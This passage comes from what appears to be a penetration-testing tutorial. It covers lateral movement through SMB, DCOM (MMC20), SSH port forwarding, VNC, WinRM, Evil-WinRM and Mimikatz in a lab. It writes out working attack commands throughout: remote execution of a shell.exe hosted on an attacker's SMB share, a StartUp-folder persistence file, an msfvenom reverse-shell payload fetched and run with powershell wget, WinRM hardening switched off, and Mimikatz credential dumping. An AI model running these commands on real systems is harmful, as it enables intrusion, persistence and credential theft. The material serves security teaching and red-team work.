+<p><span style="color: #000000;">Another example of this could be to write a bat file in a remote share of victim 192.168.0.120 which would save our payload execution command in StartUp and this will be executed next time system restarts.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cmd.exe /Q /c "echo ‘cmd.exe /c \\192.168.0.89\sharename\shell.exe’" 1&gt; \\192.168.0.120\C$\ ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\ignite.bat 2&gt;&amp;1</pre>
+<h4><span style="color: #000000;">SharpMove.exe SMB RCE</span></h4>
+<p><span style="color: #000000;">0xthirteen has developed a C# script called <a style="color: #000000;" href="https://github.com/0xthirteen/SharpMove">SharpMove</a> which utilizes many different remote services to conduct code execution. It can use an SMB share on a remote system to execute code. It can also try and disable AMSI as an added bonus. In this example, we will modify an existing service by entering our own code in it. We just created a service called “ignite” while demonstrating sc.exe, let’s modify that service. Execution on system with hostname “DESKTOP-9GSGK09” can be achieved like so:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">SharpMove.exe action=modsvc computername=DESKTOP-9GSGKO9 command="cmd.exe /c \\192.168.0.89\sharename\shell.exe" amsi=true servicename=ignite username=Administrator password=123</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjOFahaY2LV5GEEuhkq-jIDryXxPO9Et5Bz3rqn9U-dosD6ioxt_62p0zH_qDAVH_4CyG3dMOharCm1EqhbQCM3Q9e9JLLnf3-roOxyih-yY9cv0996bAM2BIFTFM_dGtcof1KL0VCxI6ltJA1WLOTFj6QkaxiAyMbCTc0rEy_jFD69ilkvUbShH8G_9w/s16000/28.png"/></span></p>
+<p><span style="color: #000000;">As you can see, SharpMove.exe has updated the service binpath and a reverse shell has been achieved successfully.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhV1lOwkvUcb6Y2TpWHEJN0XUXceQVwjuPmyn6RVJfadVK6dfvlQeeRsc_jGZFYt0Pqy91yMCJSrDKCButSzf8SRQ5hsyeSZN01OjgkqdUAy1ssraDmgVnEYRSKl94sWLqHYhFz_GXqJMA3zsr_wrjDi1ggiHfdgzyAXnJ0iRVu3LjEZ30V8-aFY9fIfg/s16000/29.png"/></span></p>
+<h3><span style="color: #800000;">Lateral Movement through DCOM (T1021.003)</span></h3>
+<p><span style="color: #000000;">According to Microsoft, “The Microsoft Component Object Model (<span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://docs.microsoft.com/en-gb/windows/win32/com/the-component-object-model?redirectedfrom=MSDN">COM</a></strong></span>) is a platform-independent, distributed, object-oriented system for creating binary software components that can interact. COM is the foundation technology for Microsoft’s OLE (compound documents), ActiveX (Internet-enabled components), as well as others.</span></p>
+<p><span style="color: #000000;">It is not a programming language but a standard that is only applicable to code that has been compiled to binary. Programming languages like C++ provide simple mechanisms to play with COM objects. C, Java implement COM too.”</span></p>
+<p><span style="color: #000000;">A COM object is one in which access to an object’s data is achieved exclusively through one or more sets of related functions. These function sets are called interfaces, and the functions of an interface are called methods. Further, COM requires that the only way to gain access to the methods of an interface is through a pointer to the interface. In other words, COM enables a binary to interact with other software objects or executables by implementing objects which can call DLLs and EXEs. <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/4a893f3d-bd29-48cd-9f43-d9777a4415b0?redirectedfrom=MSDN">DCOM</a> </strong></span>(Distributed COM) is middleware that extends the functionality of COM beyond a local computer using remote procedure call (RPC) technology.</span></p>
+<p><span style="color: #000000;">By default, only Administrators may remotely activate and launch COM objects through DCOM</span></p>
+<p><span style="color: #000000;">DCOM can execute macros in Office documents and also interact with WMI remotely thus opening the attacked domain to a wide array of vectors.</span></p>
+<p><span style="color: #000000;"><strong>Please note that this attack works on a domain-joined system.</strong> DCOM remoting is not available across networks by default. To enable DCOM remoting, some magical code is required which is not in the scope of this article. (Though, I have done it and am using the non-domain joined system to do so)</span></p>
+<h5><span style="color: #000000;"><strong>Mmc20.application remote DCOM</strong></span></h5>
+<p><span style="color: #000000;">You use Microsoft Management Console (MMC) to create, save and open administrative tools, called consoles, which manage the hardware, software, and network components of your Microsoft Windows operating system. MMC runs on all client operating systems that are currently supported. Here, Enigma0x3’s method (ref <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/">here</a></strong></span>) is being used.</span></p>
+<p><span style="color: #000000;">First, let’s see mmc20.application’s registry entry using powershell. The ProgID is required to create its an instance in a remote system. Next, we will create a new instance of this program mmc20 on our target system (192.168.0.119) using Powershell.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">Get-ChildItem 'registry::HKEY_CLASSES_ROOT\WOW6432Node\CLSID\{49B2791A-B1AE-4C90-9B8E-E860BA07F889}'
+$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.0.119"))</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgyr4OBio6cybxkORq2f3hpe9OLHACLWkUIgMLTCEV3WPxirLfXhx9YOJBSOHAU2Oz-x_hDUBVxu7mPo3nWHigwEJR4mHvsL7kL74p58u2t0K4Upq4kudssOObSH78F-fThIzZy4Pxpl6pdNOLrN63uZS-NZJh6IpNQHfU3FxICTq35Ax7aVmck5HvqPg/s16000/30.png"/></span></p>
+<p><span style="color: #000000;">We created an object called $dcom that spawns different functions mmc can perform. One such is ExecuteShellCommand</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiyJLPQTzXLdP8o5FHxWngEqCVHlQ0NuIgVBPOMUpY2f_htXicpQdhmLfIR6dTFLuZ4cZk8OqoMkLIM4wsmUF-L_jipd-efexJFJ7WjT5twJxrluPEHcmaVa21n5BzCpx4QjG8vhUwwqrrUSTA9TOA8UN0Tg7Ydqbk-_mc7kF0hqFX_VQgZzvy3lrUzpA/s16000/31.png"/></span></p>
+<p><span style="color: #000000;">We will use this function to execute a command on this remote DCOM object so created.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c \\192.168.0.89\sharename\shell.exe &gt; output.txt","7")</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjOejm75xWAXKD9_28901Sqhwy6n_mvJwGnSYEsnxhpNPMEqvovhkc1qDrjMD9gXgDFYugoHtH5GXohAkg9vIIcU1TjCF0aMLk5dmjGXpVeccZWNlNRn3xVlGjU7cyjiEOm-zdKj_7N-PmTAYMY85MwcAGwG4rWbFS43xUrIdatYLyR_n0yT3mN87U7fg/s16000/32.png"/></span></p>
+<p><span style="color: #000000;">Upon successful execution, we see a hit on our SMB server, the executable is fetched and executed</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiGlZOtrE10xdM0vnF-iB9srddV1_BlDB3J4OCVu98yY0NTr4TJ2rAvHwgprh9K_EMlIodzLQKQNokJuk04D0vWy_45DuHvzsD3zjBX1W8OlsHq8MgxZ7EBwpoLlBtWp8wiJLR5uKgHaBeRNkpmoplheQIWg1pa1Pw0CMzMBb2fntnZpOz7BBktwWA51w/s16000/33.png"/></span></p>
+<p><span style="color: #000000;">This gives us a nice reverse shell and lateral movement has, therefore, been achieved!</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh5Ev-BZ29In-IxKwSDyeSmO2Igv3fdzCvQA2G5GaL1wrnfEa_mNltLv43ADESEUrxIj9przKq8dQUpb8gC2m8dhlLQpsvPQKRv8HjXLzK8dI-4hi0HcLFc4PwZWXzVso9xyAlVGdt6EPmq-Onem3SFHfQR-uGz6OVJL6V6unO9W2CZqT5tO1wvjkjGCg/s16000/34.png"/></span></p>
+<h3><span style="color: #800000;">Lateral Movement through SSH (T1021.004)</span></h3>
+<p><span style="color: #000000;">SSH is the most widely used cross-platform protocol that lets a user connect to remote sessions and allows file copy as well. Often there are different subnetworks being used in corporate environments which may not be reachable to an attacker directly due to firewall restrictions or due to a different network interface. In such scenarios, moving laterally through SSH can open a variety of options for an attacker. Let’s see some methods.</span></p>
+<h4><span style="color: #000000;">SSH Port Forwarding</span></h4>
+<p><span style="color: #000000;">For comprehensive use-cases and a guide to port forwarding, I highly recommend reading <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.hackingarticles.in/comprehensive-guide-on-ssh-tunneling/">this</a> </strong></span>article. We take a simple scenario here. Our destination server has the following IP address and username</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhBaEboKjdEwYR8iG6fbkaBud8KQSxnPMnTir_kU7MwhJukLXZAeZRLi1fDV9qD88_5pqpQq6ZGVPKucew9KYFeRa_bpT1b62nKpP-4bEAjjV1lUkYWVlS5l3Tl_-A13HK760Bc0v-9jv6e0TrUNLMKoD02Rje3x6cPuI3JQbfXhG9IN0D1Nj0nO2r_0Q/s16000/35.png"/></span></p>
+<p><span style="color: #000000;">Now, we have compromised a system with username “hex” successfully that has 2 network cards. One on the same network as our attacker machine and one on our destination server’s network.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEje54uwCHRVTI7iLLMYxFP-wbqjAhiAEDhiZTbJqSJq6Gl8CIh9P_QplK9OMhIfP03YpRsqw_Oqj7HtbkeOxG7fq8VaaUM1d2_t8XxRfaSrHAHUBp648XoDmrhyoQasI34wtEEJJWx5Qd28qGWbgPTXMAMONZ-3nBQZNSlFu67J26Nm7FOlXHbf-ZEzMw/s16000/36.png"/></span></p>
+<p><span style="color: #000000;">And as you can see, our attacker machine has a different subnet than our destination and our ping isn’t reaching, so it isn’t directly accessible.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjqQIkG2KoJKeTMYpKKt9c69zL0YhoVu613xXAs8vLZgXsOROSN4aQHedWNlO1zYnAk4t26YAQiDQCvYBLCTJRu_sn0KidGgoMwLUhPZ1pc2aR8sSQwN_VLPrteYCfF7yPv7Xurb5oSRiN4PYCtPBGmrnKyBsNFDnKkGcXlQ-SbI9jCRx8XSai_FObkNQ/s16000/37.png"/></span></p>
+<p><span style="color: #000000;">To set up a local port forward, which allows us to redirect any incoming traffic at a specific port to the destination server, we follow the following schema:</span></p>
+<p><strong><span style="color: #000000;">ssh -L LOCAL_PORT:DEST_IP:DEST_PORT COMPROMISED_USERNAME@COMPROMISED_SERVER</span></strong></p>
+<p><span style="color: #000000;">Thereafter, we have to specify hex’s password.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">ssh -L 7000:192.168.179.130:22 hex@192.168.0.119</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjIDi4Tnt7_L50KdiTgl4leErFDyJnrT5hUsLdKjRVoXGgHkgWxMm2kZtSNue6iwS2QgknlOaA3jLd2DeHnw-g1gHY5UHInAiGMgxzpzEIkVLPN901TNVTS1Cnz7GKSJpUOfKzdYUIYBpCdGR8jLbbrdFU-DiNMtcv5DXMGAyhB1ZzjZV2oTRnG9DB5Ww/s16000/38.png"/></span></p>
+<p><span style="color: #000000;">Upon successful setup, we would now be able to connect to the destination server! First, make sure there are no pre-existing localhost entries in the known_hosts file (by using ssh-keygen -R)</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">ssh-keygen -R 127.0.0.1
+ssh server@127.0.0.1 -p 7000</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgPqqzyrQ7EW3Tey1zuCkLJpqD7LRjn7fwvS85HgwXw96ZKHAZ0eJp7dqk1hHXkKq-e7CiBc6BjZrH2dkNoLD89xSE34YxkhUclbVZV-bF9HwPkgPbEnoCz8WcAh8GTwtyxstBeLH5P6mFT9kh3Vb1j1Q4vhQRg6VJx0AjxlflUm0PY1EPusDENswbAGw/s16000/39.png"/></span></p>
+<p><span style="color: #000000;">As you can see, we have successfully connected to our destination!</span></p>
+<h3><span style="color: #800000;">Lateral Movement through VNC (T1021.005)</span></h3>
+<p><span style="color: #000000;">VNC or Virtual Network Computing is a service that uses the Remote Frame Buffer protocol to enable graphical remote access of another system. It is an interactive session since the user can give the mouse and keyboard inputs through VNC to the original system. Defining like that seems so similar to the Remote Desktop Protocol that we discussed some while back but there is a prominent difference between the two. The VNC is platform-independent which means it can work with Linux and Windows whereas the RDP can only work between two Windows Machines.</span></p>
+<p><span style="color: #000000;">According to MITRE, “Adversaries may abuse VNC to perform malicious actions as the logged-on user such as opening documents, downloading files, and running arbitrary commands. An adversary could use VNC to remotely control and monitor a system to collect data and information to pivot to other systems within the network.”</span></p>
+<p><span style="color: #000000;">Let’s see one such method.</span></p>
+<h4><span style="color: #000000;"> </span><span style="color: #000000;">VNCinject payload</span></h4>
+<p><span style="color: #000000;">Vncinject is a payload available to be used with msfvenom, it installs a reflective vnc DLL on the attacker system and connects back to the attacker system. It may be noted that for further lateral movement using this, it can be kept in a share, and a remote execution method like psexec may be used.</span></p>
+<p><span style="color: #000000;">Let’s create a payload first and host it in our web server to be downloaded and executed at the system</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">msfvenom -p windows/x64/vncinject/reverse_tcp lhost=192.168.1.4 lport=4532 -f exe &gt; vnc.exe</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhbSpaqy_DkBBOgFXxHdEco11qYQZBC7x9FLtw3zE1OG3mY_eCfI7w391YqX9Enen-N7r6QTKqqm3c8cAMdgo5iAWG1YQ57NfHy4EYdAZdCA8P417xbq9JnJDdE96rOppnpcZoPbIj0B2V6a7Y4l4L_3q6uV68BCFgM82EqXbQaCUsDfCGe76UWVjznWg/s16000/40.png"/></span></p>
+<p><span style="color: #000000;">Now, we make our victim execute this payload. This could be done by sending in phishing links etc. For simplicity, we are just using powershell wget to download and execute (simulation)</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">powershell wget 192.168.1.4/vnc.exe -O vnc.exe
+vnc.exe</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiJ7B0oQM0rjsunqhLq-sGqUuK2bxfVLgu_Px9W13myXXrRF1LsvUeaDdwPj-KrsS8ojb2V_4o2PL8sCwz0frZR18GQXpQ3SiNuScGx7Are-pBJvI4DHruiX4jZxiPFLI8LODDSv8uPKGjOrOSWCENMUhKxtFIJLGd02w22HsNFX987v68J-e3WQCTPGw/s16000/41.png"/></span></p>
+<p><span style="color: #000000;">Now we set up multi/handler and wait for a callback. Upon successful execution, we receive a callback in our console.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">use multi/handler
+set payload windows/x64/vncinject/reverse_tcp
+set lhost 192.168.1.4
+set lport 4532
+run</pre>
+<p><span style="color: #000000;"><strong><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiQv2uRcUTUv-0kFWx7OgeZOWzmh1GRRFA21r4hp1yJhcVHk9rFlIdZHlKFkzTXhxl6tiw5CXDhToSkKqdpeypaFUHyPTotfsCKtz2JwU9pbzckOWh_gTCDypyLY7nPTAEUVMHec_J2uXIxK30xd4WFKvI7syxSazK8SecPUR1D_mTzYnAKP7UwU9VHJQ/s16000/42.png"/><br/>
+</strong></span></p>
+<p><span style="color: #000000;">After a short while, we will receive a full-fledged VNC session and lateral movement has now been achieved!</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgObqBPx-BlBLlE1kKJXk3kmvGU2Dv6ZfjVllsCsDtGnWSKMR87NyB51_2Q4Qc1AwugMa2VoWxGeMf4jQ24VmThFTDsANGIJv8ATPISjXwXP_EbfzIQJkbGUIFZ148z5FkUH5ZS08x4ZTUr7hoG0l6X8HQMm8dK1hv0dxHAxO7V820Ipj58NnFShmsKJw/s16000/43.png"/></span></p>
+<p><span style="color: #000000;"><strong>Note: </strong>For more VNC pentesting cases, read our article <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.hackingarticles.in/vnc-penetration-testing/">here</a></strong></span></span></p>
+<h3><span style="color: #800000;">Lateral Movement through WinRM (T1021.006)</span></h3>
+<p><span style="color: #000000;">WinRM is a command-line tool that enables administrators to remotely execute the CMD.exe commands using the WS-Management protocol. This specification describes a general SOAP-based protocol for managing systems such as PCs, servers, devices, Web services, other applications, and other manageable entities. It uses port 5985 for HTTP transport and 5986 for HTTPS Transport.</span></p>
+<p><span style="color: #000000;">On server and client versions of the Windows operating system, Enable-PSRemoting allows the administrator to access the remote shell using Powershell for private and domain networks through WinRM service.</span></p>
+<p><span style="color: #000000;">Read Microsoft’s documentation <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://docs.microsoft.com/en-gb/windows/win32/winrm/installation-and-configuration-for-windows-remote-management?redirectedfrom=MSDN">here</a> </strong></span>about WinRM</span></p>
+<p><span style="color: #000000;">First, to set up WinRM we need to execute the following commands in an Admin Powershell window only. This would enable winrm, allow HTTP connection (as by default no SSL cert is there for HTTPS in a system) and allow all users by adding them in trusted hosts.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">Enable-PSRemoting -Force
+winrm quickconfig
+winrm set winrm/config/service '@{AllowUnencrypted="true"}'
+Set-Item WSMan:localhost\client\trustedhosts -value *</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg6GyelLop_vSBT9yPM9a2MasOxA39suZneIWH4nFWDmOldt4HdJWQiBUXhKHVTIuSI_bsUz0NZRTeR8qv9O9UcoN3KoPpjIabVBeYtS52EHZNG8d-brHpFeB-33hzlOwiqvm_Qlfubao15sGr9pxGplfuyGn2Eunn-rh7NmFVslcelsDLIck-xrGorww/s16000/44.png"/></span></p>
+<p><span style="color: #000000;">For WinRM service, we can manually traverse the config too like this and setting/changing any value.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd WSMan:\localhost\Client
+set-item .\allowunencrypted $true</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgl-r6hSFv1YpUbbocUjB8Etrt_1P7QrEcpchcoP3xj0_IppxdfIqruM2P-HlHrPcM3hyGh99cjPcMN7UDW-OJJJads1aWRvrhBDQZpKC-n7BwMTV_xrgw07eHmKNLoddWlAPkNJHcfvET8ERwHskT1GKIj9EByyIIUg7S9rdTlwYc440bon91baDq2hQ/s16000/45.png"/></span></p>
+<p><span style="color: #000000;">For a domain environment, often tools like WinRS won’t work due to Kerberos. Hence, we need to activate basic authentication mechanism.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">set-item  WSMan:\localhost\Service\Auth\Basic $true
+set-item  WSMan:\localhost\Service\AllowUnencrypted $true</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg8Su18pZJMbVnmPrFBO0sW-MgDZ0RMqLw_iL12iEV_qCrTfkyoQpN7z7XFpC4evdgMvw6JcaLanq6CKL8ec8PLeN9GJQYQtJTSVfk-4KeE4Xuj39Ktfw9_LJFUkUmgXEehBAIkAcdxSEx2iKO-myKrD10bg6DUNKdjNzyXjXaLcwlfl2qgg8x-n7cLbg/s16000/46.png"/></span></p>
+<h4><span style="color: #000000;">New-PSSession Powershell</span></h4>
+<p><span style="color: #000000;">New-PSSession command in powershell creates a new persistent powershell remote session. By providing in the remote credentials, you see that we have connected to the server. Useful in scenarios where one system has access to a target/destination server and we need to connect to it but our attacker system can’t reach it.</span></p>
+<p><span style="color: #000000;">We can further execute the malicious executable that we have kept in our SMB share for further lateral movement.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">New-PSSession -ComputerName 192.168.1.2 -Credential (Get-Credential)
+Enter-PSSession 2
+cmd.exe /c \\192.168.1.4\sharename\shell.exe</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjtIBJUDn3AV2zdUgf2o1GaxlQX16lqYxDw9_R0QsoqiCJFwhVKBwB5DDeiFyvBnHEasQSike5XvCo7Bi0ZtsF-ZdbBOewg1H9l2ZFehyiSjWvKa4_jJBxKq-ZwSCOm70sVE8nvwI7NOtEx12Wy_Vi6KMqpNMGYcRXimyeHchb6von6rQJjAufB8lJigQ/s16000/47.png"/></span></p>
+<p><span style="color: #000000;">You see, now server has bypass the incoming connections of firewall which were restricting a user to connect to it. We have made server connect to us instead!</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiFY2PJzRD8iHXa-IWp9xpE5jsp_m-42bI6UN_wdFIXYp0ZGUy9l_Srtheq-mE69H-tWUURMbTdarKX5WTYPlKUWBUPCa4ndT441XNR9V_DS5veeFhIyoSSp__HAFAGdrooI3LjkwaWb5RJf5_rIa0rvjmKw8tdn7gt03HpJH-P2MFKaW6PYkaGwWjlKA/s16000/48.png"/></span></p>
+<p><span style="color: #000000;">It gives us a neat reverse shell!</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh3CHqR_1zCrCqPyQiPEbWRMpGcpwXXbDsqDB06nAqSDzYJXCTw7FIe_hw5WBHHW75tK6lWbd17BNfIpetXla1481_TQ6jcgN1LZoeWMALLOL_T4JHfOQ-TrmxEDadPcGIl2s-I-zosIFLRWL6eylcgaF0HOOhE-Aa3fNLqeTUGPvBraILdXsicJYO1ow/s16000/49.png"/></span></p>
+<h4><span style="color: #000000;">Invoke-Command Powershell</span></h4>
+<p><span style="color: #000000;"><strong data-start="111" data-end="129">Invoke-Command</strong> is a cmdlet in <strong data-start="145" data-end="159">PowerShell</strong> that runs specified commands on remote systems using <strong data-start="213" data-end="239">WinRM interoperability</strong>. Admins typically use this cmdlet to <strong data-start="277" data-end="299">auto-install tools</strong> or software. However, it can also be leveraged for <strong data-start="351" data-end="371">lateral movement</strong>. By specifying our command within a <strong data-start="408" data-end="425">“scriptblock”</strong>, we can execute it on a remote system. The <strong data-start="469" data-end="486" data-is-only-node="">“-Credential”</strong> flag allows the user to input credentials, which can also be bypassed by creating a block and feeding it to <strong data-start="595" data-end="604">STDIN</strong>.</span></p>
+<p><span style="color: #000000;"><strong>Invoke-Command dc1.ignite.local -Credential $cred -ScriptBlock {cmd.exe /c \\192.168.1.4\sharename\shell.exe}</strong></span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhlaYLwxeGJxLbIRBshsbx1dIZoVWVJkcQr2a-KCyW6AO5-beARxtedQ2shNifIyRy-1gBss3jnaVPE7WaZuwADpnUn6O-H60ejZM9EuKjQ78vcCUOScbnHswXzFetDMK5qwHHeESaRsuyVe4GHfJ42mQbMxYRizwb2Udh5PvpJomrHNW9NvQf_epJ6bg/s16000/50.png"/></span></p>
+<p><span style="color: #000000;">This gives us a healthy shell!</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjeolN8bKPSzdb9c7zF7VBvp-8dmsSh6kfnsh8TTwqS9_6x1xvhX9hLYo65neKyxDRDDGP7yLl01Ion0r7y3lI7i17BvJn2dlYKAlKGKLpkW2YQLye5b3kc588MqXBEQVuEdlfOj9yrF4SYu8021ujm1CVs0u_83tVpEuaX8Sv3RyNDfQ5ryrAL5P7zkw/s16000/51.png"/></span></p>
+<h4><span style="color: #000000;">Winrs</span></h4>
+<p><span style="color: #000000;"><strong data-start="612" data-end="621">Winrs</strong> stands for <strong data-start="633" data-end="657">Windows Remote Shell</strong>, and it functions similarly to <strong data-start="689" data-end="706">New-PSSession</strong>. It has been a part of Windows since <strong data-start="744" data-end="759">Server 2008</strong>. <strong data-start="761" data-end="770">Winrs</strong> enables you to execute code on a remote system, but it only supports <strong data-start="840" data-end="864">basic authentication</strong>. For instance, we can execute <strong data-start="895" data-end="908" data-is-only-node="">shell.exe</strong> stored in our <strong data-start="923" data-end="936">SMB share</strong> like this:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">winrs /r:dc1 /username:Administrator /password:Ignite@987 "cmd.exe /c \\192.168.1.4\sharename\shell.exe"</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh_cZbYaaIdGn_kHhTbcj9yWoxh9Auz0BaWt8KHAYz64NmRldyUXYmedZabfCmHKGF_0PVDztPiwfQBGuveCRRKJgk6W68vFXKSQ_7bCjRm7C0BtOKRQKBK6pT7wTQWhaRDX4hIWtnr2S6ztd2r-37MF72vlrnU6IsYs4Imx_WURCtD2VrXwUKefnNQPg/s16000/52.png"/></span></p>
+<p><span style="color: #000000;">Which gives us a reverse shell successfully!</span></p>
+<p><span style="color: #000000;"><strong><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjgQskD93WiZmpytEp4ePxkzLLAMP1e_GChNTd5HH4vhOLb5WkpCoGxMx2pkMSWk1H8WphnhtGA3OWvatKiDpAgsSec3duBS3p4tszN3t5YesJ_zEWSD4qo-Rg5uJ-q4DsA1p0sBFyWB0_XmKRAvKaTShzQQ7ldNVr7hR0Pl6BApQv-zyZh7xg2MiyePQ/s16000/53.png"/><br/>
+</strong></span></p>
+<h4><span style="color: #000000;">Evil-Winrm</span></h4>
+<p><span style="color: #000000;"><strong data-start="1031" data-end="1045">Evil-WinRM</strong> is a widely used tool among <strong data-start="1074" data-end="1089">Red Teamers</strong> for conducting <strong data-start="1105" data-end="1125">lateral movement</strong> across a network using <strong data-start="1149" data-end="1158">WinRM</strong>. While it operates similarly to Windows’ remote shell capabilities, it includes some additional features that enhance its effectiveness. <strong data-start="1296" data-end="1315">Written in Ruby</strong>, you can install it by running <code data-start="1347" data-end="1371">gem install evil-winrm</code>. After installation, you can use it to connect to a remote server, as demonstrated below:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">evil-winrm  -i 192.168.1.2 -u Administrator -p 'Ignite@987'</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhYg6U0ZeemxU4gSzJMNwjomuG1_dISzpabnuKAxLAzJVZ5WIyFj-WtG-sqC1i7sMOXCEB1_Nosv-P3OuaV6vZwOxMqiZZJe2hdPVwCkvapk3Xfz3vJStbvBWXzHzPfbQBplBQGZ1zclpNZdG1njlvLDv8fULViSJNRhB-z-omxVZrjJNrGrQ9dl-lBNQ/s16000/54.png"/></span></p>
+<p><span style="color: #000000;">Now, I have created a folder called binaries under /root, which includes a Mimikatz powershell script (found <a style="color: #000000;" href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1">here</a>).</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEio1MGF2nwP-jBx983yaIDr3FgqAtrru0pYo-3BVTBdjJIq_yedBniDkfBbigLZJM7GkQFRqGN5Pzn2yZ0bqJCFtJLCimh3Gc8ZxiIbaVBRNrPjwm09KmNoUNeEGrzEb1_DbJI_QCJwVb4MNxc0wKmxfTGintbcp-NnO1RCSfy6b4rrPVpwRXZq8XM_KQ/s16000/55.png"/></span></p>
+<p><span style="color: #000000;">Evil-WinRM can upload these powershell scripts (kept in a folder) and let us execute its powershell functions! For that we use -s and provide the path of binaries folder. Thereafter, we can use Invoke-Mimikatz and as you can see, mimikatz has worked and dumped cached passwords in the server.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">evil-winrm  -i 192.168.1.2 -u Administrator -p 'Ignite@987' -s '/root/binaries'
+Invoke-Mimikatz.ps1
+Invoke-Mimikatz</pre>
+<p><span style="color: #000000;"><strong> <img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgcbS78xAmzph_q_B_6tcsrxelhdkdIB1vjRbGZmBdAPLOXVT6nlrBv-Pz_hDf9mwvVFknagaTQqffC9Jzq8PG8GuWOYkvMHCS5KRnL5rHQHCqqnYEksG3wizKIE2uAOKZdctyA4qy6o_jss8CGL1m2cECD57fw2F3UT_tTRxw5b0qbJ3u37WqarOQIvA/s16000/56.png"/></strong></span></p>
+<h3><span style="color: #800000;">Lateral Movement through Mimikatz</span></h3>
+<p><span style="color: #000000;">Mimikatz contains many options that aid with lateral movement. One such is dumping passwords. We can do that using the sekurlsa module:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">privilege::debug
+sekurlsa::logonpasswords</pre>
